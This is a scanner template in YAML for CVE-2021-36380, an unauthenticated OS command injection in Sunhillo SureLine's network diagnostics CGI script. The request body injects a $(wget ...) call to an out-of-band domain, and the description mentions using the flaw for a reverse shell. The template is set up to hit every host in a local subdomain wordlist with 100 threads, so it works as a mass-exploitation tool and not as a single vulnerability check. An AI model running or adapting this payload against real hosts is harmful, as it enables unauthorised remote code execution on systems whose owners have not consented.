id: CVE-2021-36380

info:
  name: Sunhillo SureLine - Unauthenticated OS Command Injection
  description: The /cgi/networkDiag.cgi script directly incorporated user-controllable parameters within a shell command, allowing an attacker to manipulate the resulting command by injecting valid OS command input. The following POST request injects a new command that instructs the server to establish a reverse TCP connection to another system, allowing the establishment of an interactive remote shell session.
  author: gy741
  severity: critical
  reference: |
    - https://research.nccgroup.com/2021/07/26/technical-advisory-sunhillo-sureline-unauthenticated-os-command-injection-cve-2021-36380/
  tags: cve,cve2021,sureline,rce,oob

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        POST /cgi/networkDiag.cgi HTTP/1.1
        Host: {{Subdomains}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate

        command=2&ipAddr=&dnsAddr=$(wget+http://{{Host}}.{{Port}}.{{Subdomains}}.2021.36380.{{MY-DOMAIN}})&interface=0&netType=0&scrFilter=&dstFilter=&fileSave=false&pcapSave=false&fileSize=
